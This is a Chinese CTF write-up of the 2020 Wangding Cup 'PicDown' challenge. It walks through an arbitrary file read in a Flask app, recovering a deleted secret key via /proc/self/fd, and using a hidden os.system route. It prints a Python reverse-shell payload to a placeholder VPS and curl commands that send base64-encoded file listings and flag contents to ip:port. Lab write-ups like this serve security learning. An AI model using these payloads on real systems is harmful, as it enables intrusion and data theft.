---
title: '[网鼎杯 2020 白虎组]PicDown'
date: 2024-06-08 17:04:52
tags: shell反弹
categories: 刷题笔记
---

### [网鼎杯 2020 白虎组]PicDown（ncshell反弹

）

### 非预期解

```
/etc/passwd
```

![image-20240603210859418](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406032109597.png)

存在任意文件读取漏洞，我们直接访问flag

<!-- more -->

```
/flag
```

![image-20240603211004900](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406032110050.png)

得到flag

### 预期解

首先通过proc查看系统进程

> 在linux中，proc是一个虚拟文件系统，也是一个控制中心，里面储存是当前内核运行状态的一系列特殊文件；该系统只存在内存当中，以文件系统的方式为访问系统内核数据的操作提供接口，可以通过更改其中的某些文件来改变内核运行状态。它也是内核提供给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。
> /proc/pid/cmdline 包含了用于开始进程的命令 ；
> /proc/pid/cwd 包含了当前进程工作目录的一个链接 ；
> /proc/pid/environ 包含了可用进程环境变量的列表 ；
> /proc/pid/exe 包含了正在进程中运行的程序链接；
> /proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；
> /proc/pid/mem 包含了进程在内存中的内容；
> /proc/pid/stat 包含了进程的状态信息；
> /proc/pid/statm 包含了进程的内存使用信息。

查看启动进程的命令

```
/page?url=/proc/self/cmdline
```

![image-20240603211548099](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406032115216.png)

发现app.py文件，使用任意文件读取漏洞读取文件

```
/page?url=app.py
```

得到源码

```
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

进行代码审计：

1. **程序起始部分**
   在/tmp/secret.txt路径下读取了密钥，并且保存在SECRET_KEY变量里面，然后在系统上删除了源文件，导致我们无法通过任意文件读取漏洞获取密钥。但是没有关闭文件流f，所以我们能够在/proc/self/fd/xxx里找到进程打开的文件信息。
2. **page函数**
   这个就是提交主页参数后进行的逻辑，使用url参数提交，可以重定向到输入的url。
3. **manager函数**
   接口路由/no_one_know_the_manager，接口接收两个参数key和shell，如果key的值和之前读取的密钥SECRET_KEY相等，那么就调用os.system()函数执行shell参数传入的命令，但是不回显结果。

首先获取SECERT_KEY的值

```
/page?url=/proc/self/fd/3
```

![image-20240603212131581](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406032121725.png)

然后调用manager函数反弹shell即可，其中`xx.xx.xx.xx`为VPS地址，端口任意指定。

```
/no_one_know_the_manager?key=MIkqY/cmvTlyt1V1bQ0A8XbJWHAkgxkgb6lVaF3+SmY=&shell=export%20RHOST%3d"xx.xx.xx.xx";export%20RPORT%3d20101;python%20-c%20'import%20sys,socket,os,pty;s%3dsocket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn("sh")'
```

服务端起监听，根目录下读取flag文件即可。

![image-20240608170557287](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20240608170557287.png)



**curl反弹shell**

客户机监听端口3333

```
nc -lvp 3333

no_one_know_the_manager?key=lxzY3xvJIDngLAx7RogcmxYWJX5MOWEKSCyT36xso7k=&shell=curl ip:port/`ls /|base64`

no_one_know_the_manager?key=lxzY3xvJIDngLAx7RogcmxYWJX5MOWEKSCyT36xso7k=&shell=curl ip:port/`cat /flag|base64
```

执行的命令分别是

```
ls /|base64
cat /flag|base64
```

base64解码就行

![在这里插入图片描述](https://img-blog.csdnimg.cn/4263b1cc60514d51aa7f8b186f9e5528.png)
